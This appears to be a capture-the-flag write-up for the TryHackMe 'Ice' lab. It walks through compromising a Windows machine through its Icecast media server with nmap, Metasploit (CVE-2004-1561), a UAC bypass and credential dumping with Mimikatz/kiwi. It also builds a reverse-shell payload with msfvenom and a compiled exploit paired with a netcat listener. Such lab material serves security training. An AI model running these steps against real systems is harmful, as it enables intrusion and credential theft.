# Ice

Link: [Ice](https://tryhackme.com/room/ice)

## High-Level Overview

Exploit a Windows machine that is running an insecure media server.

## Tools Needed

* OSINT
* Nmap
* Netcat
* Metasploit
* Mimikatz

## Walkthrough

* Scanning for open ports and services using `nmap`:

```bash
$ sudo nmap -sS -A -Pn -p- MACHINE:IP -vvv -oN nmap-scan -T5
```

* There are quite a few services running which can be seen in the output from the `nmap` command that is listed below:

```
PORT      STATE    SERVICE            REASON          VERSION
135/tcp   open     msrpc              syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open     netbios-ssn        syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds       syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open     ssl/ms-wbt-server? syn-ack ttl 127
|_ssl-date: 2023-04-25T15:16:13+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=Dark-PC
| Issuer: commonName=Dark-PC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-04-24T15:09:48
| Not valid after:  2023-10-24T15:09:48
| MD5:   215eeb3083c13ff345863ae0de75e56c
| SHA-1: 927e4a0ce66bd9dc542228a3fd04506c40e10b3e
| -----BEGIN CERTIFICATE-----
...
|_-----END CERTIFICATE-----
3997/tcp  filtered agentsease-db      no-response
5357/tcp  open     http               syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp  open     http               syn-ack ttl 127 Icecast streaming media server
32922/tcp filtered unknown            no-response
49152/tcp open     unknown            syn-ack ttl 127
49153/tcp open     unknown            syn-ack ttl 127
49154/tcp open     unknown            syn-ack ttl 127
49158/tcp open     unknown            syn-ack ttl 127
49159/tcp open     unknown            syn-ack ttl 127
49160/tcp open     unknown            syn-ack ttl 127
```

* Quite a few ports appear open, including some interesting services such as **Icecast**. Running a vulnerability scan using `nmap` against the machine using the command below:

```bash
$ sudo nmap -A -T4 -p 8000 --script vuln MACHINE:IP -vv -d
$ sudo nmap -A -T4 -p 8000 --script=http-slowloris-check MACHINE:IP
```

* Identified a CVE in the **Icecast** streaming media server, output below:

```
PORT     STATE SERVICE VERSION
8000/tcp open  http    Icecast streaming media server
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
```

We should see if there is any other CVE that would allow us to gain access to this machine. And we can see this machine also has the vulnerability [CVE-2004-1561](https://www.cvedetails.com/cve/CVE-2004-1561/) which allows for remote code execution.

* Running metasploit console

```bash
$ msfconsole
> search icecast
> use 0
> show options
> setg LHOST VPN:IP:HERE
> setg RHOSTS MACHINE:IP:HERE
> setg RPORT 8000
> exploit
> show sessions
# meterpreter
> getuid
> sysinfo
> run post/multi/recon/local_exploit_suggester
# exploit/windows/local/bypassuac_eventvwr
# CTRL + Z
> sessions
> use exploit/windows/local/bypassuac_eventvwr
> show sessions
> set session 1
> set LHOST VPN:IP:HERE
> run
> sessions 2
> getprivs
# SeTakeOwnershipPrivilege - this is what we needed
```

Looting credentials from this machine. In the same meterpreter session we will be using mimikatz, and manipulating processes and services running.

```bash
> ps
> migrate -N spoolsv.exe
> getuid
# now we are the user NT AUTHORITY\SYSTEM
# with full administrator permissions, we will use Mimikatz to dump all the passwords
> load kiwi
> help
> creds_all
> run post/windows/manage/enable_rdp
```

## Exploitation without Metasploit

* Download fixed version of exploit from [here](https://github.com/ivanitlearning/CVE-2004-1561) as `568.c`
* Generate payload using `msfvenom` and your VPN IP

```bash
$ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=MACHINE:IP LPORT=443 -b '\x0a\x0d\x00' -f c

unsigned char buf[] = 
"\xbf\................"
...
..
.
```

* Replace the shellcode payload in the `568.c` exploit with your generated custom payload
* Compile the the exploit and set up a `nc` listener on your attacking machine

```bash
gcc 568.c -o 568
chmod +x 568
sudo nc -nvlp 443
./568 MACHINE:IP
```